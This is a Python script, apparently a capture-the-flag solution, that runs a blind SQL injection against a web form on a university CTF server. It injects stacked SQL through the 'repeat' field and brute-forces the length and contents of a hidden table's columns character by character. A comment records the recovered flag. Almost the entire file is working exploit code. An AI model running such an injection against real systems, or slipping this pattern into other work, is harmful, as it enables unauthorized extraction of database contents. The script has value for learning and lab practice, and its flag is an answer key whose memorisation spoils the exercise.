from bs4 import BeautifulSoup
import requests
import string
url = 'http://ctf99.cs.ui.ac.id:9011/new/'
def get_csrf():
    response = requests.get(url)
    csrf_cookie = response.cookies
    # print(csrf_cookie)
    register_html = response.text

    soup = BeautifulSoup(register_html, 'html.parser')
    csrfmiddlewaretoken = soup.find("input", {"name": "csrfmiddlewaretoken"})['value']
    return csrf_cookie, csrfmiddlewaretoken

def probe_length(item, table, offset = 0):
    length_bruteforce = 0
    while True:
        csrf_cookie, csrfmiddlewaretoken = get_csrf()

        payload = """year' FROM TIMESTAMP '2022-01-01 00:00:00'))); """
        payload += f"""INSERT INTO app_reminder (title, execdate, period) """
        payload += f"""SELECT 'abc', execdate, 1 """
        payload += """FROM app_reminder """
        payload += """WHERE 1=1 AND """
        payload += f"""(SELECT LENGTH({item}) FROM {table} LIMIT 1 OFFSET {offset}) = {length_bruteforce} """
        payload += """LIMIT 1 """
        payload += """RETURNING "app_reminder"."id"; """
        payload += "--"

        data = {
            'title': 'abc',
            'csrfmiddlewaretoken': csrfmiddlewaretoken,
            'repeat': payload,
        }
        response = requests.post(url, data=data,cookies=csrf_cookie)
        # print(payload)
        # print(response.text)
        if "went wrong" in response.text:
            length_bruteforce += 1
            # print(length_bruteforce)
            continue
        if "successfully" in response.text:
            print("Length is:" + str(length_bruteforce))
            return length_bruteforce

def probe_string(item, table, offset = 0):
    item_length = probe_length(item, table, offset)

    string_bruteforce = ''
    counter = 1
    while counter <= item_length:
        for char in string.printable:
            try_string = string_bruteforce + char
            csrf_cookie, csrfmiddlewaretoken = get_csrf()

            payload = """year' FROM TIMESTAMP '2022-01-01 00:00:00'))); """
            payload += f"""INSERT INTO app_reminder (title, execdate, period) """
            payload += f"""SELECT 'abc', execdate, 1 """
            payload += """FROM app_reminder """
            payload += """WHERE 1=1 AND """
            payload += f"""(SELECT SUBSTRING({item},1,{counter}) FROM {table} LIMIT 1 OFFSET {offset}) = '{try_string}' """
            payload += """LIMIT 1 """
            payload += """RETURNING "app_reminder"."id"; """
            payload += "--"

            data = {
                'title': 'abc',
                'csrfmiddlewaretoken': csrfmiddlewaretoken,
                'repeat': payload,
            }
            response = requests.post(url, data=data, cookies=csrf_cookie)
            # print(payload)
            # print(response.text)
            # input()
            if "successfully" in response.text:
                string_bruteforce = try_string
                # print(string_bruteforce)
                counter += 1
                # print(string_bruteforce)
                break
            else:
                continue

    return string_bruteforce

for i in range(100):
    print(probe_string('title', 'app_datarahasia', i)) # row 3 has flag
    print(probe_string('data', 'app_datarahasia', i)) # CSCE604258{4notheR_sqlI_Blind}
